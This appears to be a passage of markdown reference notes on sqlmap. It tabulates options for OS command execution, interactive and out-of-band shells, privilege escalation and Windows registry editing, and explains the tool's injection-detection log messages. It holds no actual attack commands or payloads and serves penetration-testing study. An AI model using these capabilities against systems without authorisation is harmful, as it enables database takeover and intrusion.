### Operating System access

| Option                  | Description                                            |
| ----------------------- | ------------------------------------------------------ |
| `--os-cmd=<os_cmd>`     | Execute an operating system command.                   |
| `--os-shell`            | Prompt for an interactive operating system shell.      |
| `--os-pwn`              | Prompt for an OOB shell, Meterpreter or VNC.           |
| `--os-smbrelay`         | One-click prompt for an OOB shell, Meterpreter or VNC. |
| `--os-bof`              | Stored procedure buffer overflow exploitation.         |
| `--priv-esc`            | Database process user privilege escalation.            |
| `--msf-path=<msf_path>` | Local path where Metasploit Framework is installed.    |
| `--tmp-path=<tmp_path>` | Remote absolute path of temporary files directory.     |

### Windows Registry Access

| Option                      | Description                              |
| --------------------------- | ---------------------------------------- |
| `--reg-read`              | Read a Windows registry key value.       |
| `--reg-add`               | Write a Windows registry key value data. |
| `--reg-del`               | Delete a Windows registry key value.     |
| `--reg-key=<reg_key>`     | Windows registry key.                    |
| `--reg-value=<reg_value>` | Windows registry key value.              |
| `--reg-data=<reg_data>`   | Windows registry key value data.         |
| `--reg-type=<reg_type>`   | Windows registry key value type.         |


### General

| Option                            | Description                                                    |
| --------------------------------- | -------------------------------------------------------------- |
| `-s <session_file>`               | Load session from a stored (`.sqlite`) file.                   |
| `-t <traffic_file>`               | Log all HTTP traffic into a textual file.                      |
| `--abort-on-empty`                | Abort data retrieval on empty results.                         |
| `--answers=<answers>`             | Set predefined answers (e.g., `"quit=N,follow=N"`).            |
| `--base64=<base64_param>`         | Parameter(s) containing Base64 encoded data.                   |
| `--base64-safe`                   | Use URL and filename safe Base64 alphabet (`RFC 4648`).        |
| `--batch`                         | Never ask for user input, use the default behavior.            |
| `--binary-fields=<binary_fields>` | Result fields having binary values (e.g., `"digest"`).         |
| `--check-internet`                | Check Internet connection before assessing the target.         |
| `--cleanup`                       | Clean up the DBMS from sqlmap specific UDF and tables.         |
| `--crawl=<crawl_depth>`           | Crawl the website starting from the target URL.                |
| `--crawl-exclude=<crawl_exclude>` | Regexp to exclude pages from crawling (e.g., `"logout"`).      |
| `--csv-del=<csv_del>`             | Delimiting character used in CSV output (default `,`).         |
| `--charset=<charset>`             | Blind SQL injection charset (e.g., `"0123456789abcdef"`).      |
| `--dump-file=<dump_file>`         | Store dumped data to a custom file.                            |
| `--dump-format=<dump_format>`     | Dump data format (`CSV` (default), `HTML`, `SQLITE`, `JSONL`). |
| `--encoding=<encoding>`           | Character encoding used for data retrieval (e.g., `GBK`).      |
| `--eta`                           | Display for each output the estimated time of arrival.         |
| `--flush-session`                 | Flush session files for current target.                        |
| `--forms`                         | Parse and test forms on target URL.                            |
| `--fresh-queries`                 | Ignore query results stored in session file.                   |
| `--gpage=<google_page>`           | Use Google dork results from specified page number.            |
| `--har=<har_file>`                | Log all HTTP traffic into a HAR file.                          |
| `--hex`                           | Use hex conversion during data retrieval.                      |
| `--output-dir=<output_dir>`       | Custom output directory path.                                  |
| `--parse-errors`                  | Parse and display DBMS error messages from responses.          |
| `--preprocess=<preprocess>`       | Use given script(s) for preprocessing (request).               |
| `--postprocess=<postprocess>`     | Use given script(s) for postprocessing (response).             |
| `--repair`                        | Redump entries having unknown character marker (`?`).          |
| `--report-json=<report_json>`     | Store run results to a JSON file.                              |
| `--save=<save_config>`            | Save options to a configuration INI file.                      |
| `--scope=<scope>`                 | Regexp for filtering targets.                                  |
| `--skip-heuristics`               | Skip heuristic detection of vulnerabilities.                   |
| `--skip-waf`                      | Skip heuristic detection of WAF/IPS protection.                |
| `--table-prefix=<table_prefix>`   | Prefix used for temporary tables (default: `"sqlmap"`).        |
| `--test-filter=<test_filter>`     | Select tests by payloads and/or titles (e.g., `ROW`).          |
| `--test-skip=<test_skip>`         | Skip tests by payloads and/or titles (e.g., `BENCHMARK`).      |
| `--time-limit=<time_limit>`       | Run with a time limit in seconds (e.g., `3600`).               |
| `--unsafe-naming`                 | Disable escaping of DBMS identifiers (e.g., `"user"`).         |
| `--web-root=<web_root>`           | Web server document root directory (e.g., `"/var/www"`).       |


### Miscellaneous

| Option                     | Description                                                                                     |
|----------------------------|-------------------------------------------------------------------------------------------------|
| `-z <mnemonics>`        | Use short mnemonics (e.g., `"flu,bat,ban,tec=EU"`).                                          |
| `--alert=<alert>`        | Run host OS command(s) when SQL injection is found.                                            |
| `--beep`                 | Beep on question and/or when vulnerability is found.                                            |
| `--dependencies`         | Check for missing (optional) sqlmap dependencies.                                               |
| `--disable-coloring`     | Disable console output coloring.                                                                |
| `--disable-hashing`      | Disable hash analysis on table dumps.                                                           |
| `--gui`                  | Experimental Tkinter GUI.                                                                       |
| `--list-tampers`         | Display list of available tamper scripts.                                                       |
| `--no-logging`           | Disable logging to a file.                                                                      |
| `--no-truncate`          | Disable console output truncation (e.g., long entr...).                                         |
| `--offline`              | Work in offline mode (only use session data).                                                   |
| `--purge`                | Safely remove all content from sqlmap data directory.                                           |
| `--results-file=<results_file>` | Location of CSV results file in multiple targets mode.                                      |
| `--shell`                | Prompt for an interactive sqlmap shell.                                                          |
| `--tmp-dir=<tmp_dir>`    | Local directory for storing temporary files.                                                    |
| `--tui`                  | Experimental ncurses TUI.                                                                       |
| `--unstable`             | Adjust options for unstable connections.                                                        |
| `--update`               | Update sqlmap.                                                                                  |
| `--wizard`               | Simple wizard interface for beginner users.                                                      |
## SQLMap output

- Stability & dynamic analysis:

| **Log Message**                                           | **Description**                                                                                                                                                                                                 |
| --------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `target URL content is stable`                            | Indicates that responses to identical requests remain consistent. <br>This stability helps SQLMap detect anomalies caused by SQLi payloads. <br>SQLMap automatically filters out "noise" from unstable targets. |
| `GET/POST parameter 'parameter' appears to be/is dynamic` | Changing the parameter value changes the response and possibly interacts with the database.<br>Static parameters may not be processed by the target.                                                            |
| `reflective value(s) found and filtering out`             | Parts of the payload appear in the response, which could interfere with automation. SQLMap filters out these reflective values to avoid false positives.                                                        |


- Vulnerability indicators:

| **Log Message**                                 | **Description**                                                                                                                                                                                         |
| ----------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `target URL content is stable`                  | Indicates that responses to identical requests remain consistent. This stability helps SQLMap detect anomalies caused by SQLi payloads. SQLMap automatically filters out "noise" from unstable targets. |
| `GET parameter '<param>' appears to be dynamic` | The parameter’s value changes the response, suggesting it interacts with a database. A **dynamic** parameter is ideal for testing, while a **static** parameter may not be processed by the target.     |
| `reflective value(s) found and filtering out`   | Parts of the payload appear in the response, which could interfere with automation. SQLMap filters out these reflective values to avoid false positives.                                                |

- DBMS & technique detection:

| **Log Message**                                                                                                                       | **Description**                                                                                                                                                   |
| ------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `it looks like the back-end DBMS is '<DBMS>'`                                                                                         | SQLMap identifies the likely DBMS (e.g., MySQL, PostgreSQL). The user can choose to **skip tests for other DBMSes** to optimize the scan.                         |
| `for the remaining tests, do you want to include all tests for '<DBMS>' extending provided level (X) and risk (Y) values? Y/n`        | If the DBMS is confirmed, SQLMap offers to **expand testing** for that DBMS beyond the default level/risk settings, increasing coverage.                          |
| `ORDER BY technique appears to be usable`                                                                                             | The `ORDER BY` technique (used to determine column counts) is working. This **speeds up UNION-based SQLi detection** by reducing the number of required requests. |
| `automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found` | If another SQLi technique is detected, SQLMap **increases UNION test depth** (beyond the default 10 requests) for higher accuracy.                                |

- Statistical & time-based analysis:

| **Log Message**                                                                            | **Description**                                                                                                                                                                               |
| ------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `time-based comparison requires a larger statistical model, please wait........... (done)` | SQLMap is **calibrating response times** to distinguish deliberate delays (e.g., `SLEEP()`) from network latency. This ensures accurate detection of time-based blind SQLi.                   |
| `--string="<value>"`                                                                       | SQLMap uses a **constant string** (e.g., `luther`) in the response to distinguish `TRUE`/`FALSE` conditions. This simplifies detection by avoiding advanced mechanisms like fuzzy comparison. |
- Injection confirmation & exploitation:

| **Log Message**                                                                            | **Description**                                                                                                                                                                                                                                                                                                         |
| ------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `sqlmap identified the following injection point(s) with a total of <N> HTTP(s) requests:` | **Final confirmation of exploitable SQLi.** Lists injection points with:<br><br>- **Type** (e.g., boolean-based blind, UNION query).<br>- **Title** (e.g., `AND boolean-based blind - WHERE clause`).<br>- **Payload** (the exact input that triggered vulnerability). Only **proven exploitable** findings are listed. |
|  `fetched data logged to text files under '<path>'`                                        | Output (logs, session files, dumped data) is saved to the specified directory (e.g., `~/.sqlmap/output/www.example.com/`). Session files allow **resuming scans** without repeating tests.                                                                                                                              |

- Performance & optimization:

|**Log Message**|**Description**|
|---|---|
|`automatically extending ranges for UNION query injection`|SQLMap **increases UNION test depth** if other techniques (e.g., `ORDER BY`) succeed, improving accuracy for complex queries.|
|`Do you want to keep testing the others (if any)? y/N`|After confirming a vulnerability, SQLMap asks whether to **continue testing other parameters**. Useful for stopping early (e.g., in bug bounty hunting) or exhaustive scanning (e.g., penetration testing).|


## References and further reading


- [`SQLMap — hackviser`](https://hackviser.com/tactics/tools/sqlmap)

- [`Gain an Interactive OS Shell with sqlmap — LabEx`](https://labex.io/tutorials/kali-gain-an-interactive-os-shell-with-sqlmap-594139)

- To be done:
	- `--no-cast`
	- `--code`
	- `--string`
	- `--test-only`
	- `--union-cols`
	- `--csrf-token`
	- `--eval`
	- `--randomize`
	- `--tamper`
